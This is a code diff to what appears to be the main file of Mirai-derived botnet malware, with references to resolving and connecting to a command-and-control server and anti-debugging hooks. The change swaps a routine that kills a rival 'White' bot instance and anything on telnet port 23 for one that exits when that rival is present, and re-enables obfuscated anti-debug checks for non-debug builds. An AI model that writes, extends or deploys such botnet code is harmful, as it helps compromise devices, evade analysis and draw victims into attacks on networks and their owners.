@@ -25,6 +25,7 @@
 
 static void check_and_exit_self(void);
 static void check_and_kill_white(void);
+static void check_and_exit_white(void);
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
 static void establish_connection(void);
@@ -39,38 +40,38 @@ void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in a
 
 ipv4_t LOCAL_ADDR;
 
-void check_and_kill_white()
-{
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0){
-        printf("Socket error occurred!\r\n");
-    }
-    struct sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(SINGLE_INSTANCE_PORT_WHITE);
-    addr.sin_addr.s_addr = INADDR_ANY;
+// void check_and_kill_white()
+// {
+//     int sock = socket(AF_INET, SOCK_STREAM, 0);
+//     if (sock < 0){
+//         printf("Socket error occurred!\r\n");
+//     }
+//     struct sockaddr_in addr;
+//     addr.sin_family = AF_INET;
+//     addr.sin_port = htons(SINGLE_INSTANCE_PORT_WHITE);
+//     addr.sin_addr.s_addr = INADDR_ANY;
 
-    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
-        printf("White not detected! Retrying...\r\n");
-        close(sock);
-    } else {
-        printf("White detected! Killing...\r\n");
-        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT_WHITE));
-	killer_kill_by_port(htons(23));
-        close(sock);
-    }
-    //addr.sin_addr.s_addr = INET_ADDR(127,0,0,1);
-    //if (detected == FALSE){
-    //    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
-    //       printf("White not detected!\r\n");
-    //        close(sock);
-    //    } else {
-    //        printf("White detected! Killing...\r\n");
-    //        killer_kill_by_port(SINGLE_INSTANCE_PORT_WHITE);
-    //       close(sock);
-    //   }
-    //}
-}
+//     if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+//         printf("White not detected! Retrying...\r\n");
+//         close(sock);
+//     } else {
+//         printf("White detected! Killing...\r\n");
+//         killer_kill_by_port(htons(SINGLE_INSTANCE_PORT_WHITE));
+// 	    killer_kill_by_port(htons(23));
+//         close(sock);
+//     }
+//     //addr.sin_addr.s_addr = INET_ADDR(127,0,0,1);
+//     //if (detected == FALSE){
+//     //    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+//     //       printf("White not detected!\r\n");
+//     //        close(sock);
+//     //    } else {
+//     //        printf("White detected! Killing...\r\n");
+//     //        killer_kill_by_port(SINGLE_INSTANCE_PORT_WHITE);
+//     //       close(sock);
+//     //   }
+//     //}
+// }
 
 void check_and_exit_self()
 {
@@ -88,6 +89,27 @@ void check_and_exit_self()
         close(sock);
     } else {
         printf("Mirai detected! Exitting...\r\n");
+        close(sock);
+        exit(0);
+    }
+}
+
+void check_and_exit_white()
+{
+   int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0){
+        printf("Socket error occurred!\r\n");
+    }
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(SINGLE_INSTANCE_PORT_WHITE);
+    addr.sin_addr.s_addr = INADDR_ANY;
+
+    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+        printf("White not detected!\r\n");
+        close(sock);
+    } else {
+        printf("White detected! Exitting...\r\n");
         close(sock);
         exit(0);
     }
@@ -157,8 +179,8 @@ int main(int argc, char **args)
         perror("sigaction");
 #endif
     check_and_exit_self();
-    check_and_kill_white();
-
+    //check_and_kill_white();
+    check_and_exit_white();
     LOCAL_ADDR = util_local_addr();
 
     srv_addr.sin_family = AF_INET;
@@ -581,8 +603,8 @@ static BOOL unlock_tbl_if_nodebug(char *argv0)
     }
     fold %= (sizeof (obf_funcs) / sizeof (void *));
     
-//#ifndef DEBUG
-#ifdef DEBUG
+#ifndef DEBUG
+//#ifdef DEBUG
     (obf_funcs[fold])();
     matches = util_strcmp(argv0, buf_dst);
     util_zero(buf_src, sizeof (buf_src));
